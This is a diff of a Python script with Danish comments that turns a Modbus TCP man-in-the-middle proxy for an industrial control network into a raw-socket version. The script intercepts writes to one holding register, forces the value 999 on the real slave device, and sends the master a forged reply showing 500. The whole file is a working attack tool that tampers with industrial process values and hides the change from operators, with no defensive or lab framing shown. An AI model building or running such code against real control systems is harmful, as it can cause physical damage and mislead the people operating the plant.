@@ -1,133 +1,140 @@
 #!/usr/bin/env python3
 
+import socket
 import threading
+import struct
 import time
 from pymodbus.client import ModbusTcpClient
-from pymodbus.server import StartTcpServer
-from pymodbus.datastore import (
-    ModbusDeviceContext,
-    ModbusServerContext,
-    ModbusSequentialDataBlock,
-)
 
 # Network configuration
-MASTER_LISTEN_IP = "172.16.4.50"  # IP masteren forventer
-SLAVE_LISTEN_IP = "172.16.4.51"   # IP slaven forventer  
+MASTER_LISTEN_IP = "0.0.0.0"  # Lyt på alle interfaces
+SLAVE_LISTEN_IP = "0.0.0.0"
 MITM_PORT = 502
 
 # Real endpoints
-REAL_MASTER_IP = "172.16.4.50"  # eth0 side
-REAL_SLAVE_IP = "172.16.4.51"   # eth1 side
+REAL_MASTER_IP = "172.16.4.50"
+REAL_SLAVE_IP = "172.16.4.51"
 
 TARGET_REGISTER = 2
 FORCED_VALUE = 999
 MASTER_SEES_VALUE = 500
 
-# Global clients
-master_client = None
+# Global clients for manipulation
 slave_client = None
 
-class MitmDataBlock(ModbusSequentialDataBlock):
-    """Data block der logger og manipulerer data mellem master/slave"""
+def handle_client(client_sock, src_addr, target_ip):
+    """Håndter en enkelt client forbindelse og proxy til target"""
+    print(f"[+] New connection from {src_addr} -> {target_ip}:{MITM_PORT}")
     
-    def __init__(self, address, values, is_master_view=False):
-        super().__init__(address, values)
-        self.is_master_view = is_master_view
-        
-    def getValues(self, address, count=1, slave_id=1):
-        values = super().getValues(address, count)
-        direction = "MASTER->SLAVE" if self.is_master_view else "SLAVE->MASTER"
-        print(f"[READ {direction}] addr={address}, count={count}, slave_id={slave_id} -> {values}")
-        return values
+    try:
+        # Connect til real target
+        target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        target_sock.settimeout(5)
+        target_sock.connect((target_ip, MITM_PORT))
+        print(f"[+] Connected to real {target_ip}")
+    except Exception as e:
+        print(f"[!] Failed to connect to {target_ip}: {e}")
+        client_sock.close()
+        return
     
-    def setValues(self, address, values):
-        direction = "MASTER->SLAVE" if self.is_master_view else "SLAVE->MASTER"
-        print(f"[WRITE {direction}] addr={address}, values={values}")
-        
-        if self.is_master_view and address == TARGET_REGISTER:
-            # Master skriver - forward FORCED_VALUE til real slave
-            print(f"[MITM] Master skrev {values[0]}, sender {FORCED_VALUE} til real slave")
-            if slave_client and slave_client.connected:
-                try:
-                    slave_client.write_register(TARGET_REGISTER, FORCED_VALUE, slave_id=1)
-                    print(f"[+] Forwarded {FORCED_VALUE} to real slave")
-                except Exception as e:
-                    print(f"[!] Failed to forward to slave: {e}")
+    try:
+        # Bi-directional proxy med manipulation
+        while True:
+            # Read fra client
+            data = client_sock.recv(1024)
+            if not data:
+                break
             
-            # Lad master se sin ønskede værdi
-            super().setValues(address, [MASTER_SEES_VALUE])
-            return
-        
-        if not self.is_master_view and address == TARGET_REGISTER:
-            # Slave svarer på read - vis manipuleret værdi til master
-            print(f"[MITM] Slave har {values[0]}, master ser {MASTER_SEES_VALUE}")
-            super().setValues(address, [MASTER_SEES_VALUE])
-            return
+            print(f"[{src_addr[0]}->proxy] {len(data)} bytes")
             
-        # Normal forwarding eller anden register
-        super().setValues(address, values)
+            # Check om det er Modbus Write Single Register (FC=06) til vores target
+            if len(data) >= 8 and data[7] == 0x06 and struct.unpack('>H', data[8:10])[0] == TARGET_REGISTER:
+                print(f"[MITM DETECTED] Write to HR[{TARGET_REGISTER}] = {struct.unpack('>H', data[10:12])[0]}")
+                
+                # Send FORCED_VALUE til real slave i stedet
+                if target_ip == REAL_SLAVE_IP and slave_client and slave_client.connected:
+                    slave_client.write_register(TARGET_REGISTER, FORCED_VALUE)
+                    print(f"[+] Forced {FORCED_VALUE} to real slave")
+                
+                # Fake svar til client (master ser 500)
+                fake_response = data[:8] + struct.pack('>HH', TARGET_REGISTER, MASTER_SEES_VALUE) + data[12:]
+                client_sock.send(fake_response)
+                print(f"[+] Fake response sent: {MASTER_SEES_VALUE}")
+                target_sock.close()
+                client_sock.close()
+                return
+            
+            # Normal proxy
+            target_sock.send(data)
+            
+            # Read svar fra target og send til client
+            response = target_sock.recv(1024)
+            if response:
+                client_sock.send(response)
+                print(f"[proxy->{src_addr[0]}] {len(response)} bytes")
+                
+    except Exception as e:
+        print(f"[!] Proxy error: {e}")
+    finally:
+        client_sock.close()
+        target_sock.close()
 
-def create_datastore(is_master_view=False):
-    """Opret datastore med korrekt view"""
-    block = MitmDataBlock(0, [0] * 1000, is_master_view)
-    if is_master_view:
-        # Initial værdi master ser
-        block.setValues(TARGET_REGISTER, [MASTER_SEES_VALUE])
-    store = ModbusDeviceContext(hr=block)
-    return ModbusServerContext(devices=store, single=True)
-
-def master_proxy(context):
-    """Proxy for master connections"""
-    print(f"[+] Starting MASTER proxy on {MASTER_LISTEN_IP}:{MITM_PORT}")
-    StartTcpServer(
-        context, 
-        address=(MASTER_LISTEN_IP, MITM_PORT),
-        defer_start=False
-    )
-
-def slave_proxy(context):
-    """Proxy for slave connections"""  
-    print(f"[+] Starting SLAVE proxy on {SLAVE_LISTEN_IP}:{MITM_PORT}")
-    StartTcpServer(
-        context, 
-        address=(SLAVE_LISTEN_IP, MITM_PORT),
-        defer_start=False
-    )
-
-def init_clients():
-    """Initialiser connections til real devices"""
-    global master_client, slave_client
+def master_proxy():
+    """Proxy for connections fra master (lyt på 172.16.4.50:502)"""
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((MASTER_LISTEN_IP, MITM_PORT))
+    server.listen(5)
+    print(f"[+] MASTER proxy listening on {MASTER_LISTEN_IP}:{MITM_PORT} -> {REAL_SLAVE_IP}")
     
-    time.sleep(2)  # Lad proxy servers starte først
+    while True:
+        client_sock, addr = server.accept()
+        target_thread = threading.Thread(
+            target=handle_client, 
+            args=(client_sock, addr, REAL_SLAVE_IP)
+        )
+        target_thread.daemon = True
+        target_thread.start()
+
+def slave_proxy():
+    """Proxy for connections fra slave (lyt på 172.16.4.51:502)"""  
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((SLAVE_LISTEN_IP, MITM_PORT))
+    server.listen(5)
+    print(f"[+] SLAVE proxy listening on {SLAVE_LISTEN_IP}:{MITM_PORT} -> {REAL_MASTER_IP}")
     
-    # Connect to real master (eth0 side)
-    master_client = ModbusTcpClient(REAL_MASTER_IP, port=MITM_PORT, timeout=5)
-    if master_client.connect():
-        print(f"[+] Connected to real master {REAL_MASTER_IP}")
-    else:
-        print(f"[!] Warning: Could not connect to real master {REAL_MASTER_IP}")
-    
-    # Connect to real slave (eth1 side)  
-    slave_client = ModbusTcpClient(REAL_SLAVE_IP, port=MITM_PORT, timeout=5)
+    while True:
+        client_sock, addr = server.accept()
+        target_thread = threading.Thread(
+            target=handle_client, 
+            args=(client_sock, addr, REAL_MASTER_IP)
+        )
+        target_thread.daemon = True
+        target_thread.start()
+
+def init_manipulation_client():
+    """Init PyModbus client til manipulation af slave"""
+    global slave_client
+    slave_client = ModbusTcpClient(REAL_SLAVE_IP, port=MITM_PORT, timeout=3)
     if slave_client.connect():
-        print(f"[+] Connected to real slave {REAL_SLAVE_IP}")
+        print(f"[+] Manipulation client connected to slave {REAL_SLAVE_IP}")
     else:
-        print(f"[!] Warning: Could not connect to real slave {REAL_SLAVE_IP}")
+        print(f"[!] Could not connect manipulation client to slave")
 
 def main():
-    print("=== OT Modbus MITM Proxy (PyModbus 3.x Compatible) ===")
-    print(f"Master ser:     {MASTER_LISTEN_IP}:{MITM_PORT} ← eth0")
-    print(f"Slave ser:      {SLAVE_LISTEN_IP}:{MITM_PORT} ← eth1")  
-    print(f"Manipulation: HR[{TARGET_REGISTER}] = {FORCED_VALUE} (real slave) / {MASTER_SEES_VALUE} (master ser)")
+    print("=== OT Modbus MITM Socket Proxy (100% Compatible) ===")
+    print(f"Master proxy: {MASTER_LISTEN_IP}:{MITM_PORT} -> {REAL_SLAVE_IP}:{MITM_PORT}")
+    print(f"Slave proxy:  {SLAVE_LISTEN_IP}:{MITM_PORT} -> {REAL_MASTER_IP}:{MITM_PORT}")
+    print(f"HR[{TARGET_REGISTER}] manipulation: real={FORCED_VALUE}, master_sees={MASTER_SEES_VALUE}")
     print()
     
-    # Opret contexts
-    master_context = create_datastore(is_master_view=True)
-    slave_context = create_datastore(is_master_view=False)
+    # Start manipulation client
+    init_manipulation_client()
     
-    # Start proxy servers i separate threads
-    master_thread = threading.Thread(target=master_proxy, args=(master_context,))
-    slave_thread = threading.Thread(target=slave_proxy, args=(slave_context,))
+    # Start proxy servers
+    master_thread = threading.Thread(target=master_proxy)
+    slave_thread = threading.Thread(target=slave_proxy)
     
     master_thread.daemon = True
     slave_thread.daemon = True
@@ -135,17 +142,12 @@ def main():
     master_thread.start()
     slave_thread.start()
     
-    # Initialiser clients efter proxy servers er oppe
-    init_clients()
-    
     try:
-        print("[*] MITM proxy running... Press Ctrl+C to stop")
+        print("[*] MITM proxies running on all interfaces:502! (Ctrl+C to stop)")
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\n[!] Shutting down MITM proxy...")
-        if master_client:
-            master_client.close()
+        print("\n[!] Shutting down...")
         if slave_client:
             slave_client.close()
 
